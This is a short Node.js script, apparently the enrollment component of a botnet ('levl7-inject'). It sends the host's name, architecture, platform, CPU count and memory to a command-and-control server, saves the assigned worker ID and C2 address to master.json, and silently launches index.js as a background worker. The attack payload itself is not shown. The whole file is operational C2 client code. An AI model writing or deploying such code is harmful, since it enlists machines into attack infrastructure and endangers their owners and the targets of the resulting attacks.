#!/usr/bin/env node
const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const os = require("os");
const http = require("axios");

const CNC_HOST = process.env.CNC_HOST || "127.0.0.1";
const CNC_PORT = process.env.CNC_PORT || "8080";

console.log(`[levl7-inject] Injecting worker into CNC ${CNC_HOST}:${CNC_PORT}`);

async function inject() {
  try {
    const res = await http.post(`http://${CNC_HOST}:${CNC_PORT}/api/v1/workers/register`, {
      hostname: os.hostname(),
      arch: os.arch(),
      platform: os.platform(),
      cpus: os.cpus().length,
      totalmem: os.totalmem(),
    }, { timeout: 10000 });

    const { worker_id, server_id } = res.data;
    console.log(`[levl7-inject] Registered as worker: ${worker_id}`);

    const masterPath = path.join(__dirname, "master.json");
    const master = JSON.parse(fs.readFileSync(masterPath, "utf8"));
    master.worker_id = worker_id;
    master.cnc_host = CNC_HOST;
    master.cnc_port = CNC_PORT;
    fs.writeFileSync(masterPath, JSON.stringify(master, null, 2));

    execSync(`node ${path.join(__dirname, "index.js")} &`, {
      stdio: "ignore",
      env: { ...process.env, CNC_HOST, CNC_PORT, WORKER_ID: worker_id },
    });

    console.log(`[levl7-inject] Worker launched. PID: ${process.pid}`);
    console.log(`[levl7-inject] Use: node ${path.join(__dirname, "index.js")}`);
  } catch (e) {
    console.error(`[levl7-inject] Failed: ${e.message}`);
    process.exit(1);
  }
}

if (require.main === module) inject();
